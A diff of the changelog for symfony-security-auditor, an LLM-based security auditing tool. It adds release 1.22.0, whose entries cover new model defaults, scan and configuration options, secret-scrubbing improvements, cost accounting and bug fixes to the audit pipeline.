@@ -1,4278 +1,968 @@
 # Changelog
 
-All notable changes to `vinceamstoutz/symfony-security-auditor` are documented
-in this file.
+All notable changes to `vinceamstoutz/symfony-security-auditor` are documented in this file, release by release: one line per change, grouped by kind of change, written for the people who run the auditor.
 
-The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
-and this project adheres to [Semantic Versioning 2.0.0](https://semver.org). See
-[`docs/versioning.md`](docs/versioning.md) for the backward compatibility policy
-— what is public API, what is internal, and how deprecations are handled.
+This project adheres to [Semantic Versioning 2.0.0](https://semver.org). See [`docs/versioning.md`](docs/versioning.md) for the backward compatibility policy — what is public API, what is internal, and how deprecations are handled. The format of this file is described in [`.claude/rules/changelog.md`](.claude/rules/changelog.md) and enforced by `.github/scripts/check-changelog.sh`.
 
 ## [Unreleased]
 
+## [1.22.0] — 2026-10-29 — Compass
+
+### New Features ✨
+
+- The default `model` is `claude-opus-5-5`, priced below `claude-opus-4-8` in the pricing catalog; set `model: claude-opus-4-8` to keep the previous default ([#657](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/657))
+- `self-update` shows how much of the new binary has arrived while it downloads, and announces the download once on a non-terminal output ([#656](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/656))
+- Every push to `1.x` publishes a `snapshot` pre-release, versioned like `1.21.0+14.g4531440`, so a fix can be tried before it ships: `self-update --snapshot`, or the installers with `SSA_VERSION=snapshot`; a plain `self-update` takes a snapshot back to the latest release ([#631](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/631))
+- `audit.tools_scope` (`audited` by default, or `scanned`) sets which files the `read_file`, `grep` and `list_files` tools may open: `scanned` lets a `--since` or `--path` run follow a changed controller into unchanged files, sending them to the provider on request, and is cached apart from `audited`; a standalone project file may not set it ([#490](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/490), [#550](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/550))
+- With `audit.tools_scope: scanned`, the reviewer judges a finding the attacker recorded in a file read through the tools against that file's code, not an empty file ([#521](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/521))
+- `xss` is now a finding type of its own (CWE-79, OWASP A05:2025), replacing `twig_injection` and `sensitive_data_exposure` for XSS; filters and baseline entries naming either keep matching it ([#467](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/467), [#544](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/544), [#573](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/573), [#613](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/613))
+- `audit.report_path_prefix` puts the folder a project lives in before the paths of the SARIF and `github` formats, so alerts of a project in a sub-folder land on the right file; JSON and baseline paths stay project-relative ([#455](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/455))
+- `audit.min_score`, `audit.fail_on_incomplete`, `audit.format` and `audit.output` set the gate and report options in YAML; a flag always wins, `--no-fail-on-incomplete` and `--no-output` switch a configured value off for one run, and a standalone project file may not set `audit.output` ([#412](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/412), [#553](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/553))
+- `audit:run --dry-run` never writes its zero-finding estimate to a configured `audit.output`, so it cannot replace the last real report ([#412](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/412))
+- An empty `audit.output`, or an `%env()%` placeholder that resolves to nothing, prints the report as `null` does instead of stopping the run ([#586](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/586))
+- The GitHub Action's `fail-on-incomplete` input now defaults to empty and leaves the run to `audit.fail_on_incomplete`, an empty `output` input still prints the report to the job log, an empty `min-score` leaves the run to `audit.min_score`, and a command older than 1.22 is passed neither new flag ([#574](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/574))
+- The standalone binary reads your `config.yaml`, then the `.symfony-security-auditor.yaml` of the working directory, then the one of the project `audit <project-path>` names, then the flags ([#411](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/411), [#538](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/538), [#553](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/553), [#629](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/629))
+- An audited project's `.symfony-security-auditor.yaml` the standalone binary cannot accept is skipped with a warning, naming the reason, instead of stopping the run; the header names the keys such a file may not set ([#553](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/553), [#597](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/597))
+- A project `.symfony-security-auditor.yaml` over 512 KiB or nested more than 32 levels deep, or naming a baseline that is not a regular file inside the project of at most 1 MiB, is skipped with the reason instead of crashing the binary ([#579](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/579), [#602](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/602), [#629](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/629))
+- The standalone binary has `audit:diff`, `audit:trend` and `audit:baseline`, which run without any configuration ([#451](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/451))
+- `init` lists the providers the pricing catalog prices and the ten newest models each one prices, to pick by number; any other provider or model id can still be typed ([#652](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/652))
+- `init` suggests `claude-opus-5-5` as the model, and writes it under `--no-interaction` when `--model` is not given, instead of `claude-opus-4-8` ([#650](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/650))
+- `init` checks that Composer runs before it asks anything, and says whether Composer or PHP is missing and how to install it on your system; `doctor` reports the same reason; `--no-interaction` on an existing configuration without `--force` still declines the overwrite and exits `0` without checking Composer ([#476](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/476), [#583](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/583))
+- A failed chunk names its cause on the progress line, for example `✗ chunk 6/12 failed (26s) — tool-call limit reached (audit.max_tool_iterations)` ([#409](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/409))
+- `scan.include_tracked_ignored` (default `false`) audits files git tracks although a `.gitignore` pattern matches them ([#515](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/515), [#542](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/542))
+- A custom scanner can take the `--path` values of a run by implementing `ScopedProjectFileScannerInterface`; one that does not keeps the files of its configured scope under the paths ([#540](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/540), [#635](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/635))
+- `scan.include_dotfiles` (default `false`) audits dot files and dot directories under `scan.included_paths`, matched by name patterns such as `.*.php`; version-control directories (`.git`, `.svn`, `.hg`, `.bzr`, `CVS`, `_darcs`) stay out either way ([#572](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/572))
+- The report's coverage lists, as `skipped` under the `scan` stage, every file the scan leaves out for exceeding `scan.max_file_size_kb`, being unreadable or being a symbolic link, and every symlinked directory it does not enter; it never trips `--fail-on-incomplete` ([#473](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/473), [#482](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/482), [#541](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/541))
+- Two files whose names or contents read the same once their invalid UTF-8 bytes are repaired are reported `errored`, so the report is incomplete and `--fail-on-incomplete` exits `3` ([#482](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/482), [#582](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/582))
+- The secret scrubber redacts more credential shapes: every literal argument of credential-named setters and config builders, `new PDO()` arguments, `$cfg['password'] =` offsets, YAML `|` and `>` block scalars, `<argument key>` XML parameters, cut-off PEM keys, unclosed quotes and `sk-` keys of any length ([#475](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/475), [#611](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/611))
+- The secret scrubber also redacts LexikJWT `pass_phrase`, HttpClient `auth_bearer` and `auth_basic`, `Authorization` headers of any scheme, credential query parameters such as `?token=`, and the credentials passed to `new Credentials()`, LDAP `bind()`, `ldap_bind()`, Redis `auth()`, `ftp_login()`, `imap_open()`, `new mysqli()` and Guzzle's `auth` ([#611](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/611))
+- The decryption key of a Symfony secrets vault no longer reaches the provider; the file is still audited, with its key literals redacted ([#601](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/601))
+- `privacy.offline_only` bypasses an environment proxy for loopback endpoints (`localhost`, `127.0.0.0/8`, `::1`) so prompts cannot leave the machine through it; an endpoint elsewhere on the private network still uses the proxy ([#489](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/489), [#545](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/545))
+
+### Deprecations 💀
+
+- A `scan.custom_risk_patterns` bucket that names no file type never matches a file and is deprecated since 1.22, to be refused in 2.0: `audit:run` prints a notice naming the bucket and the file types to key it by ([#594](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/594))
+
+### Bugfixes 🐛
+
+- With `scan.respect_gitignore`, a symlinked directory that points into a directory a `.gitignore` ignores stays out of the skipped files on `symfony/finder` 7.4.22 and 8.1.10, as on earlier releases ([#655](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/655))
+- `self-update` says why a download failed, for example `The requested URL returned error: 403`, instead of only naming the URL ([#653](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/653))
+- With `audit.structured_collection: false`, an answer whose only finding is a bare object instead of a one-element array reports it and caches its chunk; findings written apart (one object per line, after an array, or cut off) still leave the chunk unanalyzed and uncached, and an object keyed by finding is read as its findings ([#641](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/641), [#642](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/642))
+- `audit:run --dry-run` with an `audit.max_iterations` or `audit.max_tool_iterations` so large that its token estimate overflows prints the estimate held at the largest token count instead of stopping with an unexpected error ([#641](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/641))
+- A `.gitignore` that is not a file, such as a directory a cloned repository holds under that name, no longer stops the scan with "Unexpected error": it holds no rule, the other `.gitignore` files still apply, and a warning names it ([#641](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/641))
+- `audit app/src` audits the project `app` narrowed to `src`, as `audit app --path src` does, instead of finding no file: a folder with no `composer.json` and nothing to scan, which the auditor tells without reading a file, is read as part of the Composer project it lies in, whose configuration applies, and a `--path` given from outside a project reaches it the same way ([#634](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/634))
+- A pipeline stage or token estimator defined in an application's own autoconfigured `services.yaml` now joins the audit; an autoconfigured stage runs at priority `0`, before `IngestionStage`, unless it sets a lower one ([#565](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/565))
+- An application whose `ai.yaml` configures several platforms is told so, with the platforms named and how to select one, instead of `No AI platform is configured` ([#595](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/595))
+- `install.ps1` honors `SSA_INIT=1` and runs `init` right after installing; an `init` that fails only prints a warning and keeps the installed binary ([#562](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/562))
+- The scrubber redacts a hard-coded fallback written after a code-shaped value under a credential key, such as `$password = getenv('X') ?: 'secret'`, and keeps the code around it ([#535](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/535))
+- The scrubber redacts a password written alone as the user part of a URL (`redis://secret@host`, `sendgrid://KEY@default`, `…+api` mailer schemes); `https://deploy-bot@example.com` and `ssh://git@github.com` stay readable ([#516](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/516))
+- Secret scrubbing no longer breaks the PHP and YAML the auditor parses next, so routes keep their access-control hints and `security.yaml` is still read, and only a PHP file holding a credential-named assignment or call pays for parsing it; `secret: null` and `persist-credentials: false` no longer raise the `scrubbed_secret` marker ([#471](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/471), [#499](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/499))
+- Secret scrubbing keeps the line numbers after a redaction, no longer flags a credential-free DSN such as `MAILER_DSN=null://null`, and no longer lets a `$`-prefixed secret through as an environment reference ([#464](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/464))
+- An answer whose usage is missing or reports no prompt tokens is booked at its estimated input tokens instead of zero, so `audit.budget.*`, `audit.rate_limit.*` and the report totals see the spend (default AWS Bedrock route included) ([#514](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/514), [#531](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/531), [#556](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/556))
+- Cached input is billed once, at the cache rate, for OpenAI, Gemini, DeepSeek and OpenAI-compatible gateways, so `estimated_cost_usd` and budgets no longer run up to 3x high; `audit.rate_limit.input_tokens_per_minute` still counts the whole prompt ([#456](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/456), [#589](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/589))
+- Anthropic cache writes count against `audit.rate_limit.input_tokens_per_minute`, so a run with `cache_retention: short` stays under the configured cap instead of drawing HTTP 429s ([#589](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/589))
+- Cache writes Anthropic keeps for an hour (`cache_retention: long`) are priced at twice the input rate, so the reported cost and `audit.budget.max_cost_usd` no longer run up to about 37% low ([#580](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/580))
+- Gemini and Vertex AI thought tokens are billed as output, so cost reports and `audit.budget.*` no longer run low on a thinking model ([#491](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/491))
+- A thinking model whose answer is cut off inside its reasoning is booked and answered as a `length` response instead of throwing, and a batch window no longer sends that request twice ([#492](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/492))
+- Tool conversations with a thinking-enabled model send the model's own turn back whole, signed thinking block included, instead of failing with an HTTP 400 ([#485](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/485))
+- An HTTP 403, 404 or 422 refused by an OpenAI-compatible gateway is no longer booked as spent, and the run goes on past it ([#549](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/549))
+- A `429` saying the billing quota is exhausted stops the audit at once instead of retrying for three minutes; a rate limit that suggests a wait is still retried ([#486](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/486))
+- A model answering with several tool calls in one turn no longer loses all but the first on Anthropic, Bedrock Claude, Gemini and Vertex ([#440](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/440))
+- A chunk that explored up to `audit.max_tool_iterations` records what it holds and completes instead of failing on every run: the model is told its last round is the last ([#410](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/410))
+- A model that reads past its last tool round gets one closing request to record what it holds instead of failing the chunk; a chunk ending at `audit.max_tool_iterations` with no finding, or a verdict reached there after reading files, stays out of the cache and triage memory, so the next run looks again ([#637](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/637), [#638](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/638))
+- A chunk whose `record_vulnerability` call the tool refused and the model never repeated is reported incomplete and left out of the cache, instead of being cached as analyzed ([#474](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/474), [#627](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/627))
+- A refused record call the model then makes in full is settled even when the retry re-words the title or respells the file, so the chunk no longer reads incomplete nor fails `--fail-on-incomplete` (exit `3`), and another finding of its file is never taken for that retry ([#496](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/496), [#627](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/627), [#642](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/642))
+- `record_vulnerability` and `record_review` calls missing a required key get an error back so the model retries, instead of being acknowledged as recorded ([#431](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/431))
+- A custom LLM client that ignores the tools no longer reports a clean run when its model answered findings: the answer is read as JSON, an unreadable one marks the chunk errored, and the run warns once, naming `audit.structured_collection: false` ([#600](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/600))
+- A custom LLM client's token usage, on the `audit.escalation` cheap pass too, counts toward `audit.budget.max_tokens`, the report's token totals and its cost; `audit.budget.max_cost_usd` applies only to a model the pricing catalog prices, and the run warns once for any other; `audit:run` notes when the cheap pass still runs on the symfony/ai platform beside a replaced attacker or reviewer client ([#604](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/604))
+- The DeepSeek bridge suggestion and the docs recommend `deepseek-flash` and `deepseek-v4-pro`, which the pricing catalog prices, instead of legacy ids it priced at $0 and a cost budget refused ([#581](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/581))
+- A finding the model reported but the auditor could not read no longer turns its file into a clean one: the chunk is reported incomplete and left out of the cache, and over-long text, an inverted line range, a capitalised `type` or `severity` and a percentage `confidence` are repaired ([#425](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/425))
+- A `confidence` on a zero-to-ten scale (`8`) is no longer read as a tiny percentage and filtered out: the entry is dropped, its chunk reported incomplete and asked again on the next run ([#495](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/495))
+- A finding the reviewer never judged is reported as incomplete instead of counted as a rejection, so the attacker is not told to stop reporting it and it is reviewed again on the next run ([#435](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/435))
+- A reviewer verdict of `"no"` or `"rejected"` no longer validates the finding, and an `adjusted_severity` or `corrected_type` in capitals is honoured ([#506](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/506))
+- A reviewer failure that a later iteration recovers no longer leaves the report `complete: false` ([#559](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/559))
+- One file the pre-scan flags on every line no longer stops the audit: each pattern lists its first 20 markers per file and counts the rest ([#472](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/472))
+- A suggested fix or PoC cut off by the output limit is dropped, and the finding keeps its original `remediation` or `proof` ([#463](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/463))
+- A budget or provider abort in the second half of a split chunk keeps the findings of the first half ([#466](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/466))
+- With escalation on, a cheap-model finding the deep pass judged and dropped no longer comes back into the report, also when a budget cap or a provider failure stops the deep pass on a later file ([#423](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/423))
+- Findings that collapse into one keep the most severe, a later verdict can no longer lower a reported severity, and a re-reported finding that widens over a validated neighbour absorbs it instead of inflating the risk score ([#421](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/421), [#497](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/497))
+- A copy of a finding below the confidence floor no longer hides the confident copy of the same finding, which was then never reviewed ([#513](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/513))
+- A finding is named by the project file it is about however the model spelled the path (absolute, `./`, backslashes), also when the model reported it while analyzing another file, so the reviewer sees its code and one weakness is one finding ([#422](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/422), [#481](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/481), [#569](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/569))
+- A baseline written by 1.21.0 keeps accepting a finding whose file path the model spelled differently, and `audit:baseline` matches such an entry against a report written without that baseline ([#558](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/558), [#573](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/573), [#623](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/623))
+- `audit:diff` and `audit:trend` no longer report a finding the baseline accepted, or a muted type, as fixed: it is listed as unverified ([#525](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/525), [#613](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/613))
+- `audit:baseline --prune` keeps the accepted entries, with their reasons, of findings the report was written without; the JSON report gains the keys `suppressed_fingerprints` and `suppressed_baseline_fingerprints` ([#500](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/500), [#613](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/613))
+- A baseline file escapes bidirectional overrides and other invisible characters in a finding's `title` and `file`, so a reviewed pull request cannot be spoofed ([#527](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/527))
+- `audit:baseline` and `--generate-baseline` keep accented and non-Latin `reason`, `title` and `file` text as written instead of `\uXXXX` escapes ([#502](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/502))
+- A baseline entry without a fingerprint stops a `--format=sarif` run before the first model call, as it does for every other format ([#501](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/501))
+- A SARIF report marks as accepted only as many findings as the baseline accepts ([#436](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/436))
+- A SARIF report written on Windows (`file:///C:/proj/src/A.php`) matches the project it describes, so `scan.import_sarif` imports its markers ([#448](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/448))
+- `--format=github` no longer fails the whole report on a carriage return, an invisible character, then a line feed, and no longer leaves characters unescaped next to a combining mark ([#526](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/526))
+- A scan that found no file is no longer presented as SAFE, grade A: every format reads `UNKNOWN (no file was analyzed)`, SARIF sets `executionSuccessful: false`, the JSON report gains `files_discovered`, and the GitHub Action's `highest-severity` is `UNKNOWN` ([#437](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/437), [#543](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/543), [#575](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/575))
+- `--dry-run --since` on a diff with no auditable file no longer says the scan found no file to audit ([#478](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/478))
+- `--dry-run` prices the project mapping and the system prompt every chunk carries, also with `--path`, so a route-heavy project is no longer underestimated about fivefold ([#461](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/461), [#480](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/480))
+- `audit:run --min-score` still accepts a value outside 0 to 100 and now warns on stderr what it does: above 100 fails every run, below 0 never fails one ([#537](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/537))
+- A `--path` spelled with `.`, `..` or an empty segment no longer hides the files the scan left out ([#479](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/479))
+- `--path` scans the folders and files it names, whatever `scan.included_paths` lists, reading each file once: `--path apps/api` reaches a folder it leaves out, `--path src` audits all of `src` even when it lists a narrower folder, and `--path .` keeps it ([#411](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/411), [#540](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/540), [#635](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/635))
+- Overlapping `scan.included_paths`, a folder listed inside another, no longer list a file twice, and a list of thousands of folders is resolved as fast as a short one (9,000 folders in a fraction of a second) ([#411](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/411))
+- A project path that is not a directory, or an absolute `--path`, is refused with the reason (exit `1`) instead of ending as an empty scan; an absolute `--path` inside the project is made relative, also through a link to the project, a link inside it keeping its name, one outside it is refused, and an empty scan says where it looked ([#411](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/411), [#642](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/642))
+- `audit` no longer dies in a project directory, `project-path` or `--path` whose name is not valid UTF-8 ([#483](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/483), [#528](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/528))
+- A file or file name that is not valid UTF-8 no longer aborts the audit: each invalid byte is written as the Latin-1 character of that byte, so names differing only in such bytes stay distinct, and a warning names the path, also under `--since` ([#462](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/462), [#582](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/582))
+- `--path` no longer hides `security.yaml`, voters and forms from the Symfony mapping, so a protected route is not read as lacking a check, and `audit.since_closure: direct` stays within `--path` ([#452](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/452), [#540](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/540), [#571](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/571), [#585](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/585))
+- `--since` on a repository git refuses (dubious ownership, unknown repository extension) reports git's own reason instead of blaming the ref or the project path ([#503](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/503))
+- A file named `HEAD` or `<ref>...HEAD` in the audited repository no longer makes every `--since` run fail ([#518](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/518))
+- `--since` audits a new file that was never `git add`ed, as documented ([#453](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/453))
+- `--since` audits a file that replaced a committed symlink instead of leaving it out and reading SAFE ([#570](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/570))
+- A Venice model that ends its turn with empty text no longer aborts the audit: the chunk keeps the findings already recorded and is reported incomplete ([#590](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/590))
+- A provider's HTTP 408, 425, 429 or 5xx is retried with the usual back-off whatever its bridge made of the body, so a busy Ollama server or reverse proxy gets the retries `audit.retry.max_attempts` promises ([#621](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/621))
+- An OpenAI `429` on the token limit is retried after the wait it asks for, not after the one-second request-window reset that aborted the audit after three attempts ([#592](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/592))
+- A Gemini or Vertex AI answer that ends on an abnormal finish reason (`MALFORMED_FUNCTION_CALL`, `RECITATION`, `OTHER`, …) with no content is reported as an incomplete chunk and left out of the cache, instead of reading as a clean verdict ([#620](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/620))
+- A directory the audit cannot read no longer aborts the scan: it is skipped with a `Skipped unreadable directory` warning ([#447](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/447))
+- A named pipe or other non-regular file named like a source file in a scanned folder no longer hangs the audit: it is reported as an unreadable skipped file and never opened ([#578](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/578))
+- `init` refuses a provider instance named by an `%env()%` placeholder (exit `2`) instead of writing a configuration the next run cannot select ([#427](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/427))
+- A hyphenated `offline-only` or provider instance name in `config.yaml` is read the way the audit reads it, so `self-update` honours the offline guard and `auth:set` and `auth:status` find the credential variable ([#426](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/426))
+- A `%` in the cache or working directory, or in a risk pattern, its bucket or label, a scrubbing pattern, or a skill's name or instructions of the standalone user config, is no longer read as container syntax ([#420](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/420), [#532](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/532))
+- `attacker_model`, `reviewer_model` and `audit.escalation.cheap_model` take a `%env()%` placeholder under a Symfony kernel, as `model` does ([#568](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/568))
+- A model key, `cache.dir`, `audit.baseline`, `audit.output`, `audit.report_path_prefix` or a custom skill's `instructions` set to a number or a switch, or `cache.dir` set to null, stops with a configuration error that names the key instead of a raw `TypeError` ([#587](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/587))
+- A custom risk pattern's `regex` or a secret-scrubbing pattern set to a number, a switch or null stops `audit:run` with an error that names the key instead of a raw `TypeError`, while the configuration still loads as in 1.21.0 ([#642](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/642))
+- With `privacy.offline_only`, a standalone `--dry-run` whose endpoint comes from an unset `%env()%` variable is no longer refused as a hosted provider; a real run still stops on the unset variable ([#584](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/584))
+- A `%env()%` placeholder on a number, a switch or a choice of the bundle configuration stops with a configuration error naming the key instead of a raw `TypeError` or `ValueError` ([#509](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/509), [#568](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/568))
+- An explicit `null` on a nullable numeric key (`audit.budget.max_cost_usd: ~`, `audit.min_score`, …) is accepted, as the configuration reference and the JSON schema document ([#493](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/493))
+- The configuration schema flags a misspelled vulnerability type or skill file type in the editor ([#566](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/566))
+- `provider_json_mode: true` no longer sends Claude an empty JSON schema on the `anthropic` and `bedrock` platforms, which Bedrock's Mantle route refused; it is documented as sending `response_format: json_object` only to a model whose name contains `claude` ([#494](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/494), [#591](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/591))
+- `access_control` rules are applied in the order Symfony applies them (the root block before `when@prod`, a public `route:` rule before a broader `path:` rule), so a public route is no longer shown as covered ([#511](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/511), [#529](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/529))
+- An `access_control` path that is not a valid regular expression no longer aborts the prompt build ([#441](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/441))
+- A route guarded only by `PUBLIC_ACCESS` or `IS_AUTHENTICATED_ANONYMOUSLY`, as an attribute, a `#[Security]` expression or a `denyAccessUnlessGranted()` call, is no longer counted as access-checked and gets `LACKS_ACCESS_CHECK` ([#507](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/507), [#530](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/530))
+- A route the first matching `access_control` rule lets everyone through, such as a rule with only `requires_channel` or `ips`, is marked `LACKS_ACCESS_CHECK` instead of covered ([#615](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/615))
+- The mapping reads the `access_control` rules and firewalls of every configuration file the production kernel loads (other package files, `when@prod` blocks, `imports:`, a monorepo application's own on a `--path` run), so a route they guard no longer reads as lacking a check; an unreadable security file is named in the attacker prompt ([#614](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/614))
+- `audit.since_closure: direct` also pulls in the controllers that guard with a voter constant, such as `#[IsGranted(PostVoter::EDIT)]`, and `--show-scanned` and `--dry-run` list and price the controllers it adds to a `--since` run ([#612](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/612))
+- Code slicing no longer hides string-built SQL passed to `->query(`, `->prepare(`, `->fetchAllAssociative(`, `->createNativeQuery(`, `->find(` and `->findOneBy(` from the attacker, multi-line calls included ([#442](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/442))
